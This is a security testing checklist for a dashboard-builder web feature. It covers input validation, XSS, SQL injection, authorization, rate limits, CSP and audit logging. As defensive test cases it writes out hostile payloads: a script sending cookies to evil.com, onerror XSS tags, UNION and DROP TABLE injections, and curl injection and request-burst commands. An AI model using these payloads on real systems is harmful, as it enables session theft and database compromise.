# Security Testing Checklist - Dashboard Builder

This comprehensive checklist covers all security testing for the Custom Dashboard Builder feature.

## Prerequisites

- [ ] Database migration deployed (`20251116000000_security_hardening.sql`)
- [ ] Application built with CSP headers (`npm run build`)
- [ ] Test user account created
- [ ] Access to Supabase dashboard for verification

---

## 1. Input Validation Testing

### 1.1 Template Name Validation

- [ ] **Max Length Test**
  - Action: Try to enter 101+ characters in template name field
  - Expected: Input truncated at 100 characters
  - Expected: Character counter shows "100/100"
  - Expected: Warning message "Maximum length reached"

- [ ] **XSS Attempt in Name**
  - Action: Enter `<script>alert('XSS')</script>` as template name
  - Expected: Name sanitized, script tags removed
  - Expected: Saved as plain text in database
  - Check: `SELECT name FROM shared_dashboard_templates WHERE id = ?`

- [ ] **Empty Name Test**
  - Action: Try to publish with empty template name
  - Expected: Publish button disabled
  - Expected: Error message shown

### 1.2 Template Description Validation

- [ ] **Max Length Test**
  - Action: Enter 501+ characters in description
  - Expected: Input truncated at 500 characters
  - Expected: Counter shows "500/500"

- [ ] **HTML Injection Test**
  - Action: Enter `<img src=x onerror=alert(1)>` in description
  - Expected: HTML sanitized, only safe tags allowed
  - Check database: `SELECT description FROM shared_dashboard_templates`

### 1.3 Tag Validation

- [ ] **Max Tags Test**
  - Action: Enter 11+ tags separated by commas
  - Expected: Warning "Maximum 10 tags allowed"
  - Expected: Only first 10 tags saved

- [ ] **Tag Length Test**
  - Action: Enter a tag longer than 50 characters
  - Expected: Tag truncated or validation error

### 1.4 Share Link Validation

- [ ] **Max Uses Test**
  - Action: Try to set max uses > 1000
  - Expected: Input capped at 1000
  - Expected: Warning shown

- [ ] **Expiration Test**
  - Action: Try to set expiration > 365 days
  - Expected: Error "Expiration cannot exceed 365 days"

---

## 2. XSS (Cross-Site Scripting) Testing

### 2.1 Stored XSS

- [ ] **Template Name XSS**

  ```
  Input: <script>document.location='http://evil.com?cookie='+document.cookie</script>
  Expected: Script not executed, displayed as plain text
  ```

- [ ] **Description XSS**

  ```
  Input: <img src=x onerror="alert(document.domain)">
  Expected: Image tag removed or src sanitized
  ```

- [ ] **Tag XSS**
  ```
  Input: javascript:alert(1)
  Expected: Treated as plain text tag
  ```

### 2.2 Reflected XSS

- [ ] **Search Query XSS**
  ```
  Action: Search for: <script>alert('XSS')</script>
  Expected: Query sanitized, no script execution
  ```

### 2.3 DOM-based XSS

- [ ] **URL Parameter XSS**

  ```
  URL: /dashboard-builder?share=<script>alert(1)</script>
  Expected: Parameter sanitized, no script execution
  ```

- [ ] **View Name Display**
  - Action: Create view with name `"><script>alert(1)</script>`
  - Expected: Name escaped in all UI displays

---

## 3. SQL Injection Testing

### 3.1 Template Search

- [ ] **Basic SQL Injection**

  ```
  Search: ' OR '1'='1
  Expected: Treated as literal search string
  Expected: No database error, empty results
  ```

- [ ] **Union-based Injection**
  ```
  Search: ' UNION SELECT password FROM users--
  Expected: Parameterized query prevents injection
  ```

### 3.2 Widget Configuration

- [ ] **JSON Injection**
  ```
  Widget config: {"title": "'; DROP TABLE users;--"}
  Expected: JSON escaped, no SQL execution
  ```

---

## 4. Authorization Testing

### 4.1 Dashboard Ownership

- [ ] **Update Other User's Dashboard**
  - Action: Get another user's dashboard ID
  - Action: Try to update via API
  - Expected: 403 Forbidden error
  - Expected: Error "You do not have permission to update this dashboard"

- [ ] **Delete Other User's Dashboard**
  - Action: Try to delete another user's dashboard
  - Expected: 403 Forbidden
  - Check: Audit log shows attempted unauthorized access

### 4.2 Template Ownership

- [ ] **Unpublish Other's Template**
  - Action: Get template ID published by another user
  - Action: Try to unpublish
  - Expected: 403 Forbidden
  - Expected: Template remains published

### 4.3 Share Link Ownership

- [ ] **Revoke Other's Share Link**
  - Action: Try to revoke share link created by another user
  - Expected: 403 Forbidden error

---

## 5. Rate Limiting Testing

### 5.1 Dashboard Operations

- [ ] **Rapid Dashboard Creation**
  - Action: Create 101 dashboard views in 1 minute
  - Expected: Rate limit error after ~100 requests
  - Expected: Error "Rate limit exceeded"

### 5.2 Share Link Creation

- [ ] **Rapid Link Creation**
  - Action: Create 11 share links within 1 hour
  - Expected: Rate limit error after 10 links
  - Expected: Error "Too many share links created"

### 5.3 Template Publishing

- [ ] **Rapid Publishing**
  - Action: Publish templates rapidly
  - Expected: Rate limit kicks in
  - Expected: Backoff required

---

## 6. Resource Limit Testing

### 6.1 Dashboard View Limits

- [ ] **Max Views Per User**
  - Action: Try to create 51st dashboard view
  - Expected: Error "Maximum dashboard views limit (50) reached"
  - Check database: `SELECT COUNT(*) FROM custom_dashboard_views WHERE user_id = ?`

### 6.2 Widget Limits

- [ ] **Max Widgets Per Dashboard**
  - Action: Try to add 21st widget to dashboard
  - Expected: Validation error
  - Expected: "Maximum 20 widgets allowed per dashboard"

### 6.3 Template Publish Limits

- [ ] **Max Published Templates**
  - Action: Try to publish 21st template
  - Expected: Error "Maximum published templates limit (20) reached"
  - Trigger: `check_template_publish_limit()` function

---

## 7. Audit Logging Verification

### 7.1 Dashboard Operations

- [ ] **Dashboard Created Event**

  ```sql
  SELECT * FROM audit_logs
  WHERE action = 'DASHBOARD_CREATED'
  AND user_id = 'test-user-id'
  ORDER BY timestamp DESC LIMIT 1;
  ```

  - Expected: Row exists with correct resource_id

- [ ] **Dashboard Updated Event**

  ```sql
  SELECT * FROM audit_logs WHERE action = 'DASHBOARD_UPDATED';
  ```

  - Expected: Details column contains update information

- [ ] **Dashboard Deleted Event**
  ```sql
  SELECT * FROM audit_logs WHERE action = 'DASHBOARD_DELETED';
  ```

  - Expected: Deleted dashboard ID in resource_id

### 7.2 Template Operations

- [ ] **Template Published Event**
  - Action: Publish a template
  - Check: audit_logs table has 'TEMPLATE_PUBLISHED' entry

- [ ] **Template Cloned Event**
  - Action: Clone a template
  - Check: audit_logs has 'TEMPLATE_CLONED' entry

- [ ] **Template Rated Event**
  - Action: Rate a template
  - Check: audit_logs has 'TEMPLATE_RATED' with rating in details

### 7.3 Share Link Operations

- [ ] **Share Link Created Event**

  ```sql
  SELECT * FROM audit_logs
  WHERE action = 'SHARE_LINK_CREATED'
  AND details->>'expiresAt' IS NOT NULL;
  ```

- [ ] **Share Link Revoked Event**
  - Action: Revoke a share link
  - Check: 'SHARE_LINK_REVOKED' entry exists

---

## 8. Content Security Policy (CSP) Testing

### 8.1 Inline Script Blocking

- [ ] **Console Test**
  ```javascript
  // Open browser console and try:
  document.body.innerHTML = '<script>alert("CSP Bypass")</script>';
  ```

  - Expected: CSP blocks script execution
  - Check browser console for CSP violation warning

### 8.2 External Resource Blocking

- [ ] **Unauthorized Image Load**
  ```javascript
  // Try to load image from unauthorized domain:
  const img = new Image();
  img.src = 'https://evil.com/tracking.gif';
  ```

  - Expected: CSP blocks request
  - Expected: Console shows CSP violation

### 8.3 Frame Embedding

- [ ] **Clickjacking Test**
  ```html
  <!-- Try to embed in iframe from different origin -->
  <iframe src="https://your-app.vercel.app"></iframe>
  ```

  - Expected: frame-ancestors 'none' prevents embedding
  - Expected: Browser blocks iframe

---

## 9. Session & Authentication Testing

### 9.1 Expired Session

- [ ] **Stale Session Test**
  - Action: Let session expire (24 hours)
  - Action: Try to update dashboard
  - Expected: Redirect to login
  - Expected: No data modification allowed

### 9.2 CSRF Protection

- [ ] **Cross-Site Request Test**
  - Action: Create malicious form on different domain
  - Action: Try to submit to API
  - Expected: Supabase JWT validation fails
  - Expected: 401 Unauthorized

---

## 10. Error Handling & Information Disclosure

### 10.1 Error Messages

- [ ] **Database Error Exposure**
  - Action: Trigger a database constraint violation
  - Expected: Generic error message (not raw SQL error)
  - Expected: Error "Failed to create dashboard view"
  - NOT Expected: PostgreSQL error details

### 10.2 Stack Traces

- [ ] **Production Error Test**
  - Action: Trigger an application error
  - Expected: No stack trace in response
  - Expected: User-friendly error message
  - Check: Browser console shows no sensitive info

---

## 11. Data Integrity Testing

### 11.1 Rating Constraints

- [ ] **Rating Range Test**
  ```sql
  -- Try to insert invalid rating directly
  INSERT INTO dashboard_template_ratings (template_id, user_id, rating)
  VALUES ('uuid', 'uuid', 6);
  ```

  - Expected: Database constraint error
  - Expected: Rating must be between 1 and 5

### 11.2 Share Link Expiration

- [ ] **Expired Link Usage**
  - Action: Create share link with 1-minute expiration
  - Action: Wait 2 minutes
  - Action: Try to use link
  - Expected: Link validation fails
  - Expected: "Share link has expired"

### 11.3 Max Uses Enforcement

- [ ] **Max Uses Test**
  - Action: Create link with max_uses = 2
  - Action: Use link 3 times
  - Expected: Third use blocked
  - Expected: "Maximum uses reached"

---

## 12. Performance & DoS Testing

### 12.1 Large Payload Test

- [ ] **Huge Dashboard Config**
  - Action: Try to save dashboard with 1000+ widgets
  - Expected: Validation error before database insert
  - Expected: "Maximum 20 widgets allowed"

### 12.2 Rapid Requests

- [ ] **Burst Request Test**
  - Action: Send 200 API requests in 1 second
  - Expected: Rate limiting kicks in
  - Expected: Some requests return 429 Too Many Requests

---

## 13. Browser Security Headers

### 13.1 Verify Headers

Open DevTools → Network → Select any request → Headers tab

- [ ] **Content-Security-Policy**
  - Expected: Present in response or meta tag
  - Value should include: `default-src 'self'`

- [ ] **X-Frame-Options**
  - Expected: `DENY` or `SAMEORIGIN`

- [ ] **X-Content-Type-Options**
  - Expected: `nosniff`

---

## Test Results Summary

| Category         | Tests Passed | Tests Failed | Notes |
| ---------------- | ------------ | ------------ | ----- |
| Input Validation | /13          |              |       |
| XSS Testing      | /8           |              |       |
| SQL Injection    | /4           |              |       |
| Authorization    | /7           |              |       |
| Rate Limiting    | /3           |              |       |
| Resource Limits  | /3           |              |       |
| Audit Logging    | /8           |              |       |
| CSP Testing      | /3           |              |       |
| Auth & Session   | /2           |              |       |
| Error Handling   | /2           |              |       |
| Data Integrity   | /3           |              |       |
| Performance      | /2           |              |       |
| **TOTAL**        | **/58**      |              |       |

---

## Critical Findings Template

### Finding #1

- **Severity**: [ ] Critical [ ] High [ ] Medium [ ] Low
- **Category**:
- **Description**:
- **Steps to Reproduce**:
- **Expected Behavior**:
- **Actual Behavior**:
- **Fix Recommendation**:

---

## Sign-off

- [ ] All tests executed
- [ ] Critical findings documented
- [ ] Security team notified of results
- [ ] Fixes implemented for critical/high severity issues
- [ ] Re-test after fixes completed

**Tested by**: ******\_\_\_\_****** **Date**: ******\_\_\_\_****** **Sign-off**:
******\_\_\_\_******

---

## Automated Testing Scripts

### Quick SQL Injection Test

```bash
curl -X POST 'https://your-api/search' \
  -H 'Content-Type: application/json' \
  -d '{"query": "'\'' OR 1=1--"}'
```

### Rate Limit Test Script

```bash
for i in {1..15}; do
  curl -X POST 'https://your-api/share-links' \
    -H 'Authorization: Bearer YOUR_TOKEN' \
    -d '{"dashboardId": "test"}' &
done
wait
```

### Audit Log Verification

```sql
-- Check today's audit events
SELECT action, COUNT(*) as count
FROM audit_logs
WHERE timestamp::date = CURRENT_DATE
GROUP BY action
ORDER BY count DESC;
```

---

**Last Updated**: 2025-11-16 **Version**: 1.0 **Status**: Ready for Testing
